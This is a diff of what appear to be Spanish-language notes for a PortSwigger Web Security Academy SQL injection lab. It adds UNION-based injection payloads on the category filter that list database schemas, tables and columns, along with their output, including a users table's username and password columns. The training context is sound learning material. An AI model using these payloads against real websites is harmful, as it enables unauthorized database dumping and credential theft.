@@ -27,11 +27,18 @@ To solve the lab, log in as the `administrator` user.
 
 ````py
 ## Dumpear la base de Datos:
-.web-security-academy.net/filter?category=-Pets'  Union Select '1',schema_name FROM information_schema.schemata -- -
+.web-security-academy.net/filter?category=-Pets' Union Select '1',schema_name FROM information_schema.schemata -- -
     #	information_schema
     #	public
     #	pg_catalog
 
 ## Dumpear el Nombre de las Tablas:
-.web-security-academy.net/filter?category=Pets' Union Select 1,@@version -- -
+.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
+    # products
+    # users_tcaine
+
+## Dumpear el Nombre de las Columnas:
+.web-security-academy.net/filter?category=-Pets' Union Select '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_tcaine' -- -
+    # password_wyuxxb
+    # username_fzanak
 ````
